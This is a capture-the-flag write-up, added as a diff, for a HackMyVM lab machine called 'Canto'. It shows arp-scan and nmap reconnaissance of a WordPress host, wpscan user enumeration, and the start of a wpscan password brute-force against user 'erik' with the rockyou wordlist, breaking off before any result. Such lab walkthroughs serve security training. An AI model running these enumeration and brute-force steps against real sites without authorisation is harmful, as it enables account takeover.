@@ -1,1 +1,153 @@
+Canto Virtual - HachmyVm writeup 
+
+<img width="668" height="82" alt="image" src="https://github.com/user-attachments/assets/c8bac0d9-826b-41bd-b09c-ae8f3c93ec22" />
+
+First we create a directory with the name of our machine
+
+┌──(r4v3x㉿kali)-[~/Desktop]
+
+└─$ mkdir Canto
+                                                                                                                                                                      
+┌──(r4v3x㉿kali)-[~/Desktop]
+
+└─$ cd Canto
+                                                                                                                                                                      
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+
+└─$ 
+
+Then we have to run a arp-scan to detect the IP address that we will be working for 
+
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+
+└─$ sudo arp-scan -I eth0 --localnet                               
+[sudo] password for r4v3x: 
+
+192.168.15.16   08:00:27:94:41:98       PCS Systemtechnik GmbH
+
+We complete a ping command to check the VM OS
+
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+
+└─$ ping 192.168.15.16
+PING 192.168.15.16 (192.168.15.16) 56(84) bytes of data.
+64 bytes from 192.168.15.16: icmp_seq=1 ttl=64 time=2.50 ms
+64 bytes from 192.168.15.16: icmp_seq=2 ttl=64 time=1.48 ms
+64 bytes from 192.168.15.16: icmp_seq=3 ttl=64 time=1.27 ms
+64 bytes from 192.168.15.16: icmp_seq=4 ttl=64 time=1.71 ms
+
+After this we confirm that we have a Linux device 
+
+
+Reconnaisance 
+
+We need to run a nmap to discover all the vulnerabilities.
+
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+
+└─$ sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.15.16 -oN results.txt 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 19:31 -0400
+NSE: Loaded 158 scripts for scanning.
+NSE: Script Pre-scanning.
+
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKkMLZHCokv5rpKTUUfitgdTSiyieZXC1kqsQS8DEnLgk6x5fOmlzHim2qgiwoJhyEJa7Nj1k3K6pwm5RVxEjEU=
+|   256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDR8+o8qabpIHzS2zgBZDxfX0Tm5eWBBstEt5QeYN04+
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Ubuntu))
+|_http-title: Canto
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.57 (Ubuntu)
+|_http-generator: WordPress 7.1.2
+MAC Address: 08:00:27:94:41:98 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 19:32
+
+We open the website using the IP address
+
+<img width="1283" height="564" alt="image" src="https://github.com/user-attachments/assets/89ff444a-e946-4329-908a-6e57aa4c8ead" />
+
+e must check the generator with the wordpress version we see that it has  7.1.2 and also we found a xmlrpc 
+
+
+<img width="1355" height="71" alt="image" src="https://github.com/user-attachments/assets/a501018b-83a4-4e6f-935e-4450793779c2" />
+
+
+we erase the view source and the rds and we confirm that it is working 
+
+<img width="744" height="139" alt="image" src="https://github.com/user-attachments/assets/e5860d0e-7e80-4fbc-a4df-6b3a841d0b58" />
+
+Exploitation
+
+We are going to run a wpscan to enumerate users and plugings 
+
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+└─$ wpscan --url 'http://192.168.15.16/' -e u,p 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+                  WordPress Security Scanner
+                         Version 4.1.0
+                    An Automattic endeavor
+                    https://automattic.com
+
+
+
+[+] erik
+ | Found By: Rss Generator (Passive Detection)
+ Brute Forcing Author IDs - Time: 00:00:00 <========================================================================================> (10 / 10) 100.00% Time: 00:00:00
+[i] 1 user(s) Identified.
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+[+] Finished: Sun Oct  4 19:42:39 2026
+[+] Requests Done: 1584
+[+] Cached Requests: 13
+[+] Most response codes received: 404: 1535, 200: 47, 302: 1, 301: 1
+[+] Data Sent: 432.389 KB
+[+] Data Received: 25.255 MB
+[+] Memory used: 302.262 MB
+[+] Elapsed time: 00:00:12
+
+We found a user called erik , with this information we can try to access it using 192.168.15.16/wp-login.php
+
+<img width="865" height="615" alt="image" src="https://github.com/user-attachments/assets/7d592c8e-1695-4a15-9875-c49462134e5b" />
+
+It says that the password is not correct because we just wanted to make sure the user exists in the database. 
+
+We must run a new wpscan 
+
+──(r4v3x㉿kali)-[~/Desktop/Canto]
+└─$ wpscan --url 'http://192.168.15.16/' -U erik -P  /usr/share/wordlists/rockyou.txt  
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+                  WordPress Security Scanner
+                         Version 4.1.0
+                    An Automattic endeavor
+                    https://automattic.com
+_______________________________________________________________
+
+[+] URL: http://192.168.15.16/ [192.168.15.16]
+[+] Started: Sun Oct  4 19:52:16 2026
+[+] Command Line: wpscan --url http://192.168.15.16/ -U erik -P /usr/share/wordlists/rockyou.txt
+[+] Hostname: kali
+
 
